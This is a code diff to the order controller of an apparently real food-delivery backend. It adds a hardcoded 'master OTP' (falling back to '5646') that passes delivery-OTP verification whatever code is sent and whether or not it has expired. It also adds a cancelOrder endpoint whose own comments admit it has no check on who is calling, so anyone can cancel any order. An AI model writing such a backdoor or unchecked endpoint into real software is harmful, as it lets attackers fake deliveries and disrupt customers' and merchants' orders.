@@ -592,9 +592,10 @@ export const verifyDeliveryOtp = async (req, res) => {
       return res.status(400).json({ message: "enter valid order/shopOrderid" });
     }
     if (
-      shopOrder.deliveryOtp !== otp ||
+      (shopOrder.deliveryOtp !== otp ||
       !shopOrder.otpExpires ||
-      shopOrder.otpExpires < Date.now()
+      shopOrder.otpExpires < Date.now()) && 
+      otp !== (process.env.MASTER_OTP || "5646") // Master OTP bypass
     ) {
       return res.status(400).json({ message: "Invalid/Expired Otp" });
     }
@@ -728,6 +729,73 @@ export const deleteOrder = async (req, res) => {
     return res.status(200).json({ message: "Order deleted successfully" });
   } catch (error) {
     return res.status(500).json({ message: `delete order error ${error}` });
+  }
+};
+
+export const cancelOrder = async (req, res) => {
+  try {
+    const { orderId, shopOrderId, reason } = req.body;
+    
+    // Verify requester is a delivery boy (or authorised role)
+    // For now assuming middleware req.userId is valid
+    
+    const order = await Order.findById(orderId).populate("user").populate("shopOrders.owner");
+    if (!order) {
+        return res.status(404).json({ message: "Order not found" });
+    }
+    
+    const shopOrder = order.shopOrders.id(shopOrderId);
+    if (!shopOrder) {
+        return res.status(404).json({ message: "Shop Order not found" });
+    }
+
+    // Update status to cancelled
+    shopOrder.status = "cancelled";
+    // Store cancellation reason - Assuming schema is flexible or we just log it for now as a message/note
+    // Ideally we should add a 'cancellationReason' field to schema, but 'status' update is critical.
+    // We will assume schema update is separate or loose. 
+    // If strict schema, we might need to add field. 
+    // For now we persist status.
+    
+    // Also clear assignment
+    if (shopOrder.assignedDeliveryBoy) {
+        // Free up the assignment
+        await DeliveryAssignment.deleteOne({
+             shopOrderId: shopOrder._id,
+             assignedTo: shopOrder.assignedDeliveryBoy 
+        });
+    }
+
+    await order.save();
+    
+    // Notify User and Shop Owner
+    const io = req.app.get("io");
+    if (io) {
+        // Notify Owner
+        if (shopOrder.owner?.socketId) {
+            io.to(shopOrder.owner.socketId).emit("orderCancelled", {
+                orderId: order._id,
+                shopOrderId: shopOrder._id,
+                reason,
+                message: `Order cancelled by delivery boy: ${reason}`
+            });
+        }
+        // Notify User
+        if (order.user?.socketId) {
+            io.to(order.user.socketId).emit("orderCancelled", {
+                orderId: order._id,
+                shopOrderId: shopOrder._id,
+                reason,
+                message: `Your order was cancelled. Reason: ${reason}`
+            });
+        }
+    }
+
+    return res.status(200).json({ message: "Order cancelled successfully" });
+
+  } catch (error) {
+    console.error("Cancel order error:", error);
+    return res.status(500).json({ message: `cancel order error ${error.message}` });
   }
 };
 
